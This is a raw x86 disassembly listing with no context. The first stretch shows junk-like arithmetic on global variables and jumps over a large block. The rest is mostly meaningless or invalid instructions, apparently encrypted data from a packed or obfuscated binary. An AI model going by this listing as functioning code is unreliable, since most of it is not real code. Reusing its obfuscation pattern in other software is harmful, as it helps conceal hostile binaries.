  41997e:	sbb    DWORD PTR ds:0x4282df,0x75a
  419988:	sub    DWORD PTR ds:0x428287,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42822b
  419999:	sub    ecx,DWORD PTR ds:0x42838f
  41999f:	mov    DWORD PTR ds:0x42822b,ecx
  4199a5:	cmp    DWORD PTR ds:0x42824b,0x0
  4199ac:	mov    DWORD PTR ds:0x4282e3,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42814b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x428367,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42824b,edi
  4199da:	cmp    DWORD PTR ds:0x42824b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428223
  4199ec:	push   0x427f4b
  4199f1:	call   DWORD PTR ds:0x428e90
  4199f7:	sub    DWORD PTR ds:0x428397,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x42830f
  419a03:	sbb    DWORD PTR ds:0x428297,ecx
  419a09:	adc    edx,DWORD PTR ds:0x42837b
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x4282f7,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x4282ef,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x428307
  419a31:	xor    DWORD PTR ds:0x42821b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42821f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx-0x18f7006]
  419a79:	(bad)  [ebp+0x16bbe37c]
  419a7f:	sbb    BYTE PTR [edx+edx*1+0x54e61818],bh
  419a86:	jl     0x419a68
  419a88:	ret    
  419a89:	or     DWORD PTR [ecx-0x3fc42dfe],esp
  419a8f:	and    BYTE PTR [edx],ah
  419a91:	xchg   DWORD PTR [edi+0x78],esp
  419a94:	push   eax
  419a95:	mov    BYTE PTR [esi],cl
  419a97:	popa   
  419a98:	xchg   edx,eax
  419a99:	out    dx,eax
  419a9a:	in     al,dx
  419a9b:	sub    eax,DWORD PTR [esi+ebx*2-0x6e]
  419a9f:	arpl   bx,ax
  419aa1:	push   0xc01dc49e
  419aa6:	push   ss
  419aa7:	mov    eax,0x966d9eb1
  419aac:	jo     0x419b1c
  419aae:	mov    dl,0x3c
  419ab0:	xlat   BYTE PTR ds:[ebx]
  419ab1:	(bad)  
  419ab2:	jle    0x419aa9
  419ab4:	sbb    eax,0x9354030d
  419ab9:	fimul  DWORD PTR ds:0x6eae790
  419abf:	sbb    ch,BYTE PTR [ebp+edi*8+0x11]
  419ac3:	or     DWORD PTR [esp+ecx*8],ebp
  419ac6:	mov    eax,fs:0x672dfcee
  419acc:	int3   
  419acd:	mov    bh,0x42
  419acf:	push   ds
  419ad0:	or     eax,0x7fc6ae48
  419ad5:	adc    esi,esp
  419ad7:	pop    ds
  419ad8:	mov    ds:0xa982fc46,eax
  419add:	mov    edx,0xf2d221ad
  419ae2:	fstp   TBYTE PTR [edx+0x78]
  419ae5:	push   ebp
  419ae6:	nop
  419ae7:	jns    0x419a8c
  419ae9:	or     esp,DWORD PTR [ecx-0x69]
  419aec:	push   esi
  419aed:	(bad)  
  419aee:	adc    ecx,ecx
  419af0:	pop    ds
  419af1:	inc    esi
  419af2:	add    BYTE PTR [esi+eax*8-0x6d],al
  419af6:	mov    edx,0xa8d4f733
  419afb:	(bad)  
  419afd:	stos   BYTE PTR es:[edi],al
  419afe:	mov    esi,0x6d81ea28
  419b03:	aam    0x50
  419b05:	popf   
  419b06:	jge    0x419b83
  419b08:	or     ah,BYTE PTR [ecx+0x3d]
  419b0b:	mov    ebp,0xdd007207
  419b10:	hlt    
  419b11:	loopne 0x419abc
  419b13:	lods   eax,DWORD PTR ds:[esi]
  419b14:	aas    
  419b15:	fcmovne st,st(4)
  419b17:	stos   BYTE PTR es:[edi],al
  419b18:	fs cmc 
  419b1a:	cli    
  419b1b:	pop    eax
  419b1c:	sub    eax,0xe18719ed
  419b21:	popa   
  419b22:	sbb    DWORD PTR [ebp-0x15],0xd26b9fd6
  419b29:	jnp    0x419ad5
  419b2b:	neg    ah
  419b2d:	dec    esp
  419b2e:	add    dl,BYTE PTR [ebx]
  419b30:	and    DWORD PTR ds:0x460d9003,esp
  419b36:	ins    DWORD PTR es:[edi],dx
  419b37:	sbb    dh,BYTE PTR [ebx+0x2d]
  419b3a:	fwait
  419b3b:	lds    edi,FWORD PTR [ecx+0x8]
  419b3e:	add    al,0x73
  419b40:	sub    al,BYTE PTR [ecx]
  419b42:	adc    edx,DWORD PTR [ebp+0x79ce961c]
  419b48:	cdq    
  419b49:	fucomp st(5)
  419b4b:	stos   BYTE PTR es:[edi],al
  419b4c:	call   0x109e:0xf6343ac0
  419b53:	test   al,0x2f
  419b55:	(bad)  
  419b56:	ins    BYTE PTR es:[edi],dx
  419b57:	push   ebx
  419b58:	retf   
  419b59:	dec    esp
  419b5a:	pop    esp
  419b5b:	int    0xcf
  419b5d:	sbb    bl,cl
  419b5f:	inc    esi
  419b60:	xlat   BYTE PTR ds:[ebx]
  419b61:	cmp    DWORD PTR [eax-0x4bd589ea],ebp
  419b67:	adc    al,0x7a
  419b69:	inc    edx
  419b6a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  419b6c:	dec    esi
  419b6d:	dec    ebx
  419b6e:	lea    edx,[eax+0x2]
  419b71:	mov    al,ds:0xac83b2d9
  419b76:	inc    ecx
  419b77:	test   al,0x74
  419b79:	popa   
  419b7a:	ja     0x419b72
  419b7c:	fstp   TBYTE PTR [esi-0x18423e3a]
  419b82:	jecxz  0x419bdd
  419b84:	retf   0x45e3
  419b87:	xchg   esp,eax
  419b88:	neg    BYTE PTR [ebp-0xc]
  419b8b:	outs   dx,BYTE PTR ds:[esi]
  419b8c:	or     esi,edi
  419b8e:	ins    BYTE PTR es:[edi],dx
  419b8f:	inc    esp
  419b90:	call   0x5b1d5bd5
  419b95:	scas   eax,DWORD PTR es:[edi]
  419b96:	dec    eax
  419b97:	fs sbb al,0x5f
  419b9a:	das    
  419b9b:	xor    ah,al
  419b9d:	jb     0x419b67
  419b9f:	cmp    BYTE PTR [ebp-0x38695b64],dh
  419ba5:	push   edi
  419ba6:	(bad)  
  419ba7:	out    dx,al
  419ba8:	es inc esp
  419baa:	outs   dx,BYTE PTR ds:[esi]
  419bab:	inc    edi
  419bac:	mov    dl,0x60
  419bae:	adc    DWORD PTR [ecx],edx
  419bb0:	cmp    ecx,DWORD PTR [ebx-0x2e]
  419bb3:	push   ss
  419bb4:	xchg   edi,eax
  419bb5:	ror    BYTE PTR [ecx],0x3e
  419bb8:	loop   0x419bb5
  419bba:	loope  0x419b82
  419bbc:	jmp    0x7c94:0x7be0a4d3
  419bc3:	repz fimul WORD PTR [ebx+0x46]
  419bc7:	mov    ch,0x91
  419bc9:	xchg   esi,eax
  419bca:	shl    BYTE PTR [esi-0x3d],0x2a
  419bce:	push   edx
  419bcf:	jmp    0x4736519
  419bd4:	pop    ebp
  419bd5:	scas   eax,DWORD PTR es:[edi]
  419bd6:	xchg   DWORD PTR [eax+0x72],eax
  419bd9:	cmp    dl,BYTE PTR [ebp-0x7d]
  419bdc:	pusha  
  419bdd:	adc    al,0xc0
  419bdf:	push   ecx
  419be0:	ret    0x14fc
  419be3:	cmp    edi,DWORD PTR [ecx+0x617ea59]
  419be9:	push   esi
  419bea:	pop    ebp
  419beb:	dec    ebx
  419bec:	vaddsubpd xmm3,xmm6,XMMWORD PTR [esi-0x4d]
  419bf1:	gs in  eax,0xbd
  419bf4:	imul   ebx,DWORD PTR [edx+edx*8+0x1a],0xfffffff0
  419bf9:	mov    edi,0x58d19da1
  419bfe:	sbb    BYTE PTR [esi],ah
  419c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c01:	imul   edx,DWORD PTR [ecx+edx*2+0x3e],0x9b11457f
  419c09:	inc    edi
  419c0a:	sbb    eax,edx
  419c0c:	push   ecx
  419c0d:	popa   
  419c0e:	js     0x419c01
  419c10:	lock xchg edi,eax
  419c12:	lahf   
  419c13:	fmul   st,st(2)
  419c15:	daa    
  419c16:	ret    
  419c17:	sbb    DWORD PTR [ecx],esi
  419c19:	in     eax,dx
  419c1a:	dec    esi
  419c1b:	adc    dh,BYTE PTR [edi]
  419c1d:	mov    eax,0xd30657f5
  419c22:	aaa    
  419c23:	aaa    
  419c24:	dec    ebp
  419c25:	push   cs
  419c26:	inc    esi
  419c27:	jnp    0x419be5
  419c29:	mov    esi,0x64962414
  419c2e:	or     DWORD PTR [ebx+ebx*2],eax
  419c31:	(bad)  
  419c32:	into   
  419c33:	or     BYTE PTR [edx-0xc],dl
  419c36:	sbb    eax,0x1f6e063b
  419c3b:	aam    0xda
  419c3d:	add    bh,BYTE PTR [eax-0x22]
  419c40:	pop    es
  419c41:	and    al,0x4c
  419c43:	mov    cl,0x38
  419c45:	xor    eax,0x86884649
  419c4a:	sub    eax,0x6a4a8e5f
  419c4f:	fsubr  DWORD PTR [edi-0x10c9d8f9]
  419c55:	pop    ebp
  419c56:	mov    ?,WORD PTR [ebx+0x6a3961dd]
  419c5c:	imul   esp,DWORD PTR [ebx],0x34
  419c5f:	inc    eax
  419c60:	adc    al,BYTE PTR [ebx-0x59]
  419c63:	test   DWORD PTR [ecx-0x157755b1],edi
  419c69:	mov    ebp,0x40cbd5f7
  419c6e:	(bad)  
  419c6f:	jecxz  0x419c25
  419c71:	ror    ecx,1
  419c73:	xchg   ecx,eax
  419c74:	out    0x22,eax
  419c76:	loopne 0x419ca2
  419c78:	call   0x384f:0xe4bdbc5f
  419c7f:	jno    0x419cda
  419c81:	push   ecx
  419c82:	xchg   BYTE PTR [ebp+edi*4-0x56112985],ah
  419c89:	std    
  419c8a:	std    
  419c8b:	(bad)  
  419c8d:	retf   
  419c8e:	fwait
  419c8f:	xchg   BYTE PTR ds:0xbe064e44,dh
  419c95:	sub    eax,0x449d2123
  419c9a:	and    edx,DWORD PTR [ebx]
  419c9c:	xor    eax,0x4a3b6d0f
  419ca1:	push   ds
  419ca2:	push   es
  419ca3:	test   al,0x64
  419ca5:	leave  
  419ca6:	push   eax
  419ca7:	rol    bl,cl
  419ca9:	outs   dx,DWORD PTR ds:[esi]
  419caa:	sub    BYTE PTR gs:[esi+0x3],cl
  419cae:	push   eax
  419caf:	mov    dl,0xfb
  419cb1:	fisttp WORD PTR ds:0xd00f8e3c
  419cb7:	les    edx,FWORD PTR [esp+ebx*1]
  419cba:	sbb    eax,0x4a96f575
  419cbf:	add    DWORD PTR [esi-0x75],ebp
  419cc2:	cwde   
  419cc3:	lds    ecx,FWORD PTR [esi]
  419cc5:	pushf  
  419cc6:	rol    bh,0x9
  419cc9:	pop    eax
  419cca:	push   0x2cde2808
  419ccf:	xchg   BYTE PTR [ebx],ah
  419cd1:	push   ecx
  419cd2:	jmp    0x419cd8
  419cd4:	push   edi
  419cd5:	lock mov BYTE PTR [edx+0x45],cl
  419cd9:	push   ebp
  419cda:	enter  0xf1f1,0x8a
  419cde:	scas   al,BYTE PTR es:[edi]
  419cdf:	rcl    dl,cl
  419ce1:	call   0xf78b2a99
  419ce6:	fsub   QWORD PTR es:[ecx+eax*2-0x27]
  419ceb:	adc    edx,DWORD PTR [esi]
  419ced:	push   edx
  419cee:	add    eax,0xa4c58b47
  419cf3:	scas   al,BYTE PTR es:[edi]
  419cf4:	cmp    eax,0xa872fd53
  419cf9:	loop   0x419cfa
  419cfb:	mov    DWORD PTR [edi+0xf3ceda4],esp
  419d01:	mov    ah,0xf0
  419d03:	jns    0x419d4c
  419d05:	mov    al,0x1e
  419d07:	or     eax,0x78ff89cd
  419d0c:	add    al,0xdc
  419d0e:	cmp    dh,0xac
  419d11:	sbb    eax,0x4312d608
  419d16:	pop    esp
  419d17:	sahf   
  419d18:	rcr    DWORD PTR [eax+0x1],1
  419d1b:	mov    ebp,0x2b04a4f2
  419d20:	and    al,0xb1
  419d22:	std    
  419d23:	mov    ebp,DWORD PTR [eax]
  419d25:	inc    edi
  419d26:	std    
  419d27:	inc    edi
  419d28:	int3   
  419d29:	test   DWORD PTR [esi],ebx
  419d2b:	stos   BYTE PTR es:[edi],al
  419d2c:	fs dec esp
  419d2e:	and    bh,BYTE PTR ds:0xf2cbb58e
  419d34:	out    dx,al
  419d35:	lods   al,BYTE PTR ds:[esi]
  419d36:	int    0x6a
  419d38:	ret    0x112e
  419d3b:	mov    ecx,0x8cb3a343
  419d40:	cmp    bh,BYTE PTR [edi]
  419d42:	pop    ecx
  419d43:	cmp    ebx,edi
  419d45:	(bad)  
  419d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d47:	out    dx,eax
  419d48:	sbb    eax,0x42dd4aaa
  419d4d:	inc    esp
  419d4e:	lock jl 0x419da5
  419d51:	cmp    ch,BYTE PTR [edx-0x28e6921f]
  419d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d58:	adc    al,BYTE PTR [ebp+0x39]
  419d5b:	scas   al,BYTE PTR es:[edi]
  419d5c:	xor    bl,BYTE PTR [esi]
  419d5e:	fisttp WORD PTR [ebx+0x53]
  419d61:	test   DWORD PTR [ecx+0x7a],ebp
  419d64:	imul   eax,DWORD PTR [eax-0x1b76bb91],0x7b091f30
  419d6e:	lea    eax,[eax+0x7a]
  419d71:	add    ebx,DWORD PTR [edx+0x37]
  419d74:	sub    BYTE PTR gs:[ecx],ch
  419d77:	retf   
  419d78:	ret    
  419d79:	and    esi,eax
  419d7b:	jmp    FWORD PTR [edi+0x3a]
  419d7e:	adc    DWORD PTR [edx+eax*1+0x7d],ebx
  419d82:	test   eax,0x92ba279b
  419d87:	aas    
  419d88:	add    al,0x77
  419d8a:	pop    ebx
  419d8b:	xchg   edx,eax
  419d8c:	lahf   
  419d8d:	retf   
  419d8e:	adc    al,BYTE PTR [ecx-0x32]
  419d91:	pop    esi
  419d92:	loope  0x419dda
  419d94:	xor    esp,0x2a6eac02
  419d9a:	clc    
  419d9b:	or     DWORD PTR [edx+ecx*2-0x61bc29aa],edi
  419da2:	inc    esp
  419da3:	push   eax
  419da4:	pop    ecx
  419da5:	dec    ebx
  419da6:	jmp    0xb8a2:0xa5cc1773
  419dad:	pop    ss
  419dae:	cmc    
  419daf:	cld    
  419db0:	jmp    0x9fba6805
  419db5:	icebp  
  419db6:	ret    
  419db7:	pop    esp
  419db8:	div    ebx
  419dba:	rep ins BYTE PTR es:[edi],dx
  419dbc:	dec    ecx
  419dbd:	jge    0x419df9
  419dbf:	(bad)  
  419dc0:	pop    edx
  419dc1:	mov    bl,0x50
  419dc3:	inc    ecx
  419dc4:	repnz imul edi,DWORD PTR gs:[edi+0x5628b4fd],0x1c83153d
  419dd0:	mov    dl,0xce
  419dd2:	mov    edx,0x2027fcdb
  419dd7:	rcl    bl,1
  419dd9:	lods   al,BYTE PTR ds:[esi]
  419dda:	stos   DWORD PTR es:[edi],eax
  419ddb:	or     eax,0x4493e088
  419de0:	into   
  419de1:	or     ch,bl
  419de3:	pop    ebx
  419de4:	mov    dh,0x47
  419de6:	dec    ebx
  419de7:	outs   dx,DWORD PTR ds:[esi]
  419de8:	addr16 push ebx
  419dea:	ds push 0xffffffb1
  419ded:	iret   
  419dee:	data16 sti 
  419df0:	ins    DWORD PTR es:[edi],dx
  419df1:	dec    ecx
  419df2:	dec    edx
  419df3:	enter  0x55bf,0xd3
  419df7:	sub    ebx,esi
  419df9:	xor    esp,DWORD PTR [ecx+0x3b]
  419dfc:	mov    bl,0xd8
  419dfe:	adc    al,0xb3
  419e00:	stc    
  419e01:	cwde   
  419e02:	mov    dh,0x87
  419e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e05:	sub    ch,BYTE PTR [ebx]
  419e07:	mov    edi,0xcd2845ef
  419e0c:	mov    cl,0xff
  419e0e:	dec    ecx
  419e0f:	mov    cl,dh
  419e11:	push   ss
  419e12:	jbe    0x419e90
  419e14:	jbe    0x419e8b
  419e16:	leave  
  419e17:	jo     0x419de1
  419e19:	sbb    esp,esi
  419e1b:	or     eax,0xb5e02e12
  419e20:	addr16 aas 
  419e22:	shr    BYTE PTR [edi+ecx*8],0x28
  419e26:	int    0xdf
  419e28:	mov    DWORD PTR [ebp+0x5dcd589b],edx
  419e2e:	jmp    0x419dc9
  419e30:	inc    eax
  419e31:	adc    al,0x57
  419e33:	imul   ebx,DWORD PTR ds:0x244c8b1b,0x14
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0x7ee1336e
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	es ja  0x419e9c
  419e71:	stc    
  419e72:	cli    
  419e73:	push   ecx
  419e74:	mov    bl,0x38
  419e76:	les    eax,FWORD PTR [edx+0x65]
  419e79:	imul   ebp,edx,0xffffff91
  419e7c:	or     BYTE PTR [eax-0x27],ah
  419e7f:	and    edx,ebp
  419e81:	xor    DWORD PTR [ebx-0x3d107631],ecx
  419e87:	dec    ecx
  419e88:	mov    al,0x5c
  419e8a:	enter  0x62c8,0xa5
  419e8e:	mov    eax,ds:0xa326943d
  419e93:	jg     0x419e9c
  419e95:	(bad)  
  419e96:	scas   eax,DWORD PTR es:[edi]
  419e97:	add    esp,ebp
  419e99:	fiadd  WORD PTR [edi-0x5f]
  419e9c:	sub    bh,BYTE PTR [edx-0x21]
  419e9f:	pop    ebp
  419ea0:	inc    esp
  419ea1:	mov    ecx,0x6d3ac4ee
  419ea6:	jbe    0x419e97
  419ea8:	push   ss
  419ea9:	neg    bl
  419eab:	mov    esi,0x2495f565
  419eb0:	xor    esi,DWORD PTR [esi+edx*2]
  419eb3:	(bad)  
  419eb4:	repz popa 
  419eb6:	out    dx,al
  419eb7:	call   FWORD PTR [ebx+0x2112a998]
  419ebd:	or     DWORD PTR [ecx-0x42934f6b],esp
  419ec3:	(bad)  
  419ec5:	call   0xa5f61b85
  419eca:	(bad)  
  419ecc:	push   ecx
  419ecd:	push   0x4fec8b3a
  419ed2:	dec    ecx
  419ed3:	rol    eax,1
  419ed5:	mov    ecx,0x15ab9d96
  419eda:	imul   ebx,DWORD PTR [ecx-0x6f],0xffffff8f
  419ede:	mov    esi,0x4d624bc
  419ee3:	sti    
  419ee4:	pop    cx
  419ee6:	dec    esp
  419ee7:	fldenv [esi-0x1473ba79]
  419eed:	imul   eax,esi,0x56ea901
  419ef3:	mov    ch,0x20
  419ef5:	shl    BYTE PTR [edi+0x19],0x47
  419ef9:	sbb    al,0x55
  419efb:	jmp    0x3e8:0x4bc52239
  419f02:	dec    esp
  419f03:	ins    BYTE PTR es:[edi],dx
  419f04:	mov    ds:0x430680de,al
  419f09:	mov    ds:0xfb326961,eax
  419f0e:	mov    cl,0xfd
  419f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f11:	in     eax,dx
  419f12:	rcr    DWORD PTR [ebx+0x1ff44d6],0xac
  419f19:	repnz sub DWORD PTR [ebx+0xd4c779e],0x45
  419f21:	stos   BYTE PTR es:[edi],al
  419f22:	push   ebp
  419f23:	add    eax,0x2a8283f1
  419f29:	ins    DWORD PTR es:[edi],dx
  419f2a:	jmp    0x3eb70e9a
  419f2f:	mov    al,ds:0x1bbeadb5
  419f34:	cdq    
  419f35:	iret   
  419f36:	sahf   
  419f37:	mov    esi,0x831370a3
  419f3c:	jl     0x419ef3
  419f3e:	pushf  
  419f3f:	mov    esp,DWORD PTR [ebp+ebp*2+0xff61a7c]
  419f46:	add    eax,0xda65f07d
  419f4b:	xchg   ebp,eax
  419f4c:	sbb    eax,0x331e219c
  419f51:	loope  0x419f73
  419f53:	pop    ebx
  419f54:	push   edx
  419f55:	in     eax,dx
  419f56:	arpl   si,bx
  419f58:	ss cli 
  419f5a:	div    ch
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	rcl    BYTE PTR [edx],0x40
  419f60:	test   eax,0xa21a4e2a
  419f65:	ja     0x419fb7
  419f67:	mov    edi,0xb3eb8fce
  419f6c:	pop    ecx
  419f6d:	sub    eax,0xabd466
  419f72:	iret   
  419f73:	xor    DWORD PTR [esp+ebp*1+0x2099afa2],0xfffffff2
  419f7b:	stc    
  419f7c:	fcomp  DWORD PTR [ecx+0x15]
  419f7f:	cmp    ebp,DWORD PTR [esi+eiz*2+0x7375e24c]
  419f86:	dec    ecx
  419f87:	mov    ds:0x94149f,eax
  419f8c:	dec    edi
  419f8d:	mov    gs,WORD PTR [esi]
  419f8f:	out    dx,al
  419f90:	push   esp
  419f91:	ret    0x22ff
  419f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f95:	jp     0x419f85
  419f97:	mov    cs,WORD PTR [edx]
  419f99:	xchg   edi,eax
  419f9a:	mov    bl,0xb1
  419f9c:	pop    es
  419f9d:	and    dl,BYTE PTR [edi]
  419f9f:	jle    0x419f82
  419fa1:	sub    ch,BYTE PTR [ebx+0x7a]
  419fa4:	mov    dl,0x23
  419fa6:	cmp    eax,0x5e6328a3
  419fab:	(bad)  
  419fad:	lods   eax,DWORD PTR ds:[esi]
  419fae:	push   esi
  419faf:	or     eax,0x36699e3a
  419fb4:	or     BYTE PTR [ecx+eax*2],bh
  419fb7:	mov    ah,0x73
  419fb9:	xchg   esi,edi
  419fbb:	mov    edi,0x93ab118e
  419fc0:	(bad)  [eax+ebx*2]
  419fc3:	mov    ebx,0xfa8ce84e
  419fc8:	je     0x419fcb
  419fca:	stos   DWORD PTR es:[edi],eax
  419fcb:	repz rol BYTE PTR [edi-0x48ab164e],1
  419fd2:	fucomip st,st(3)
  419fd4:	inc    ebx
  419fd5:	inc    edx
  419fd6:	ror    DWORD PTR [eax],1
  419fd8:	xchg   edi,eax
  419fd9:	stos   DWORD PTR es:[edi],eax
  419fda:	or     al,0xd7
  419fdc:	add    al,BYTE PTR [edx]
  419fde:	int3   
  419fdf:	xor    dh,BYTE PTR [esi-0x7c]
  419fe2:	shl    DWORD PTR [ebx+0x64],1
  419fe5:	addr16 jno 0x419fe0
  419fe8:	out    dx,al
  419fe9:	adc    dl,BYTE PTR [edx+edi*2+0x37e8a1b3]
  419ff0:	and    BYTE PTR [ecx+0x1ab38d08],dh
  419ff6:	test   DWORD PTR [eax-0x605b3a2a],ecx
  419ffc:	cmp    eax,0xb1bce1ea
  41a001:	mov    ebx,0x82effbf7
  41a006:	adc    eax,0x8116a3a6
  41a00b:	add    esi,DWORD PTR [edi]
  41a00d:	push   ecx
  41a00e:	pop    edx
  41a00f:	or     al,0xf0
  41a011:	and    al,0xa4
  41a013:	add    edx,DWORD PTR [eax+eiz*2-0x4f812cad]
  41a01a:	xor    bl,BYTE PTR [edx]
  41a01c:	popf   
  41a01d:	jae    0x419fb6
  41a01f:	ds retf 0xea7d
  41a023:	int    0x6d
  41a025:	cli    
  41a026:	mov    ds:0x1b3f9479,al
  41a02b:	pop    ecx
  41a02c:	mov    edi,0xadf8c77f
  41a031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a032:	pop    ss
  41a033:	dec    eax
  41a034:	xchg   BYTE PTR ds:0x62aaee70,al
  41a03a:	cs loopne 0x41a070
  41a03d:	sub    eax,0x1000e973
  41a042:	add    DWORD PTR [edi+ebp*8],esi
  41a045:	loope  0x41a07e
  41a047:	and    ebx,DWORD PTR [eax]
  41a049:	(bad)
  41a04e:	(bad)  
  41a04f:	pop    ebp
  41a050:	out    0xe4,al
  41a052:	jle    0x41a0b5
  41a054:	lods   eax,DWORD PTR ds:[esi]
  41a055:	pop    esi
  41a056:	retf   0x6b11
  41a059:	and    eax,0x64d72c02
  41a05e:	daa    
  41a05f:	mov    ds,esi
  41a061:	add    eax,DWORD PTR [edx-0x40a126b0]
  41a067:	test   BYTE PTR [ecx-0x2b],al
  41a06a:	mov    db3,edx
  41a06d:	ror    BYTE PTR [esi],0xdb
  41a070:	inc    esp
  41a071:	and    cl,cl
  41a073:	pop    ds
  41a074:	int3   
  41a075:	cld    
  41a076:	mov    ebp,DWORD PTR ds:[ecx-0x43631be2]
  41a07d:	push   ebp
  41a07e:	xchg   edi,eax
  41a07f:	hlt    
  41a080:	xor    ecx,edi
  41a082:	(bad)  
  41a083:	cmp    bl,al
  41a085:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41a087:	lock arpl WORD PTR ds:[bp+di+0x2de],ax
  41a08e:	(bad)  
  41a08f:	adc    al,0xb6
  41a091:	push   eax
  41a092:	push   0x65d71a3a
  41a097:	xchg   esi,eax
  41a098:	gs and eax,ecx
  41a09b:	sbb    DWORD PTR [edi-0x65],ebp
  41a09e:	daa    
  41a09f:	rcr    BYTE PTR [eax],1
  41a0a1:	enter  0xbf88,0xac
  41a0a5:	add    al,0x51
  41a0a7:	jbe    0x41a06a
  41a0a9:	mov    edi,0x2980d797
  41a0ae:	mov    al,ds:0x634b1089
  41a0b3:	ror    ah,cl
  41a0b5:	dec    eax
  41a0b6:	sbb    BYTE PTR [edi-0x7d],al
  41a0b9:	adc    DWORD PTR [ebp-0x2],0xbd4e5d05
  41a0c0:	lea    eax,[edx]
  41a0c2:	mov    edx,DWORD PTR [esi+0x64]
  41a0c5:	dec    eax
  41a0c6:	dec    edx
  41a0c7:	cdq    
  41a0c8:	outs   dx,BYTE PTR ds:[esi]
  41a0c9:	or     eax,0xf88978e4
  41a0ce:	hlt    
  41a0cf:	xor    DWORD PTR [ecx-0x76],eax
  41a0d2:	or     DWORD PTR [ebp-0x776b2b32],edi
  41a0d8:	nop
  41a0d9:	outs   dx,DWORD PTR ds:[esi]
  41a0da:	adc    DWORD PTR [ecx+0x7b],0xb2270b61
  41a0e1:	xor    al,0x58
  41a0e3:	inc    ebx
  41a0e4:	div    bp
  41a0e7:	(bad)  
  41a0e8:	retf   0xa8d8
  41a0eb:	cmp    esi,eax
  41a0ed:	into   
  41a0ee:	push   esp
  41a0ef:	jne    0x41a147
  41a0f1:	rol    bh,cl
  41a0f3:	stos   DWORD PTR es:[edi],eax
  41a0f4:	ret    
  41a0f5:	int3   
  41a0f6:	cli    
  41a0f7:	and    edx,ecx
  41a0f9:	adc    al,0xee
  41a0fb:	ficom  DWORD PTR [edx+edx*2-0x78f8b1ec]
  41a102:	jb     0x41a0a5
  41a104:	jae    0x41a12a
  41a106:	out    dx,eax
  41a107:	cwde   
  41a108:	fstp   QWORD PTR [ebp-0x2a]
  41a10b:	sub    eax,0x3c4cb5b
  41a110:	in     al,0xf0
  41a112:	xchg   esi,eax
  41a113:	sub    ebx,DWORD PTR [edi-0x5f]
  41a116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a117:	jle    0x41a0d4
  41a119:	je     0x41a0b8
  41a11b:	fwait
  41a11c:	inc    eax
  41a11d:	jmp    0xbaad:0x30704c06
  41a124:	mov    WORD PTR [esi-0x4d],fs
  41a127:	xchg   DWORD PTR [ebx+0xb],ebp
  41a12a:	jmp    0x41a174
  41a12c:	sbb    DWORD PTR [edx+0x40],ecx
  41a12f:	jecxz  0x41a161
  41a131:	imul   ecx,DWORD PTR [edi-0x16cb9712],0x79f0ac31
  41a13b:	cmp    al,0xcc
  41a13d:	jne    0x41a133
  41a13f:	lea    ebx,[eax+0x67]
  41a142:	inc    ebp
  41a143:	call   0xad4670e6
  41a148:	pop    ebp
  41a149:	mov    cs,WORD PTR [ebx]
  41a14b:	or     cl,ah
  41a14d:	fwait
  41a14e:	(bad)  
  41a14f:	fimul  DWORD PTR [edx-0x7a614db8]
  41a155:	or     al,0x7e
  41a157:	dec    eax
  41a158:	ret    
  41a159:	mov    ch,0xe2
  41a15b:	in     eax,0x66
  41a15d:	push   esi
  41a15e:	mov    bl,BYTE PTR [edx-0x434c04c0]
  41a164:	(bad)  
  41a165:	in     al,dx
  41a166:	loopne 0x41a1d3
  41a168:	in     eax,dx
  41a169:	cmp    BYTE PTR ss:[edx-0x6c926d72],ah
  41a170:	lds    ebp,FWORD PTR [esp+eiz*8]
  41a173:	push   edi
  41a174:	mov    WORD PTR [eax],fs
  41a176:	aaa    
  41a177:	nop
  41a178:	dec    esi
  41a179:	aad    0xde
  41a17b:	popa   
  41a17c:	test   eax,0x4c793dce
  41a181:	mov    ah,0xa9
  41a183:	cli    
  41a184:	(bad)  
  41a185:	cmc    
  41a186:	jbe    0x41a1ef
  41a188:	and    cl,BYTE PTR [ecx-0x931879d]
  41a18e:	ins    BYTE PTR es:[edi],dx
  41a18f:	adc    al,0x4a
  41a191:	loopne 0x41a11e
  41a193:	fstp   QWORD PTR ss:[edx]
  41a196:	dec    ebp
  41a197:	aad    0x8f
  41a199:	mov    bh,0x20
  41a19b:	shl    ebp,0x74
  41a19e:	xchg   edi,eax
  41a19f:	or     al,0x73
